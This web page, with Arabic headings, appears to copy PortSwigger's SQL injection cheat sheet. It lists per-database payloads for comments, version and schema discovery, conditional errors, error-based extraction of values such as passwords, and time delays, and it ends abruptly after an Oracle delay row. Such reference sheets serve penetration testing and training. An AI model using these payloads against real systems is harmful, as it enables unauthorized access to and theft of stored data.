PortSwigger Official SQL Injection Cheat Sheet

الدليل المرجعي الرسمي المطابق لـ PortSwigger مع أزرار نسخ فوري لجميع قواعد البيانات.

1. String concatenation (دمج النصوص)

DB TypePayload
Oracle'foo'||'bar'
MSSQL'foo'+'bar'
PostgreSQL'foo'||'bar'
MySQLCONCAT('foo','bar') OR 'foo' 'bar'

2. Substring (استخراج جزء من النص)

DB TypePayload
OracleSUBSTR('foobar', 4, 2)
MSSQLSUBSTRING('foobar', 4, 2)
PostgreSQLSUBSTRING('foobar', 4, 2)
MySQLSUBSTRING('foobar', 4, 2)

3. Comments (التعليقات وإبطال باقي الاستعلام)

DB TypePayload
Oracle--comment
MSSQL--comment OR /*comment*/
PostgreSQL--comment OR /*comment*/
MySQL#comment OR -- comment OR /*comment*/

4. Database version (إصدار قاعدة البيانات)

DB TypePayload
OracleSELECT banner FROM v$version OR SELECT version FROM v$instance
MSSQLSELECT @@version
PostgreSQLSELECT version()
MySQLSELECT @@version

5. Database contents (استكشاف الجدول والأعمدة)

DB TypePayload
OracleSELECT * FROM all_tables OR SELECT * FROM all_tab_columns WHERE table_name = 'TABLE-NAME-HERE'
MSSQLSELECT * FROM information_schema.tables OR SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'
PostgreSQLSELECT * FROM information_schema.tables OR SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'
MySQLSELECT * FROM information_schema.tables OR SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'

6. Conditional errors (إحداث أخطاء شرطية)

DB TypePayload
OracleSELECT CASE WHEN (YOUR-CONDITION-HERE) THEN TO_CHAR(1/0) ELSE NULL END FROM dual
MSSQLSELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/0 ELSE NULL END
PostgreSQL1 = (SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/(SELECT 0) ELSE NULL END)
MySQLSELECT IF(YOUR-CONDITION-HERE,(SELECT table_name FROM information_schema.tables),'a')

7. Extracting data via visible error messages (تسريب البيانات عبر أخطاء النظام)

DB TypePayload & Leaked Error Example
MSSQLSELECT 'foo' WHERE 1 = (SELECT 'secret')
> Conversion failed when converting the varchar value 'secret' to data type int.
PostgreSQLSELECT CAST((SELECT password FROM users LIMIT 1) AS int)
> invalid input syntax for integer: "secret"
MySQLSELECT 'foo' WHERE 1=1 AND EXTRACTVALUE(1, CONCAT(0x5c, (SELECT 'secret')))
> XPATH syntax error: '\secret'

9 & 10. Time delays & Conditional delays (التأخير الوقتي والتأخير الشرطي)

DB TypeUnconditional DelayConditional Delay
Oracledbms_pipe.receive_message(('a'),10)SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 'a'||dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual
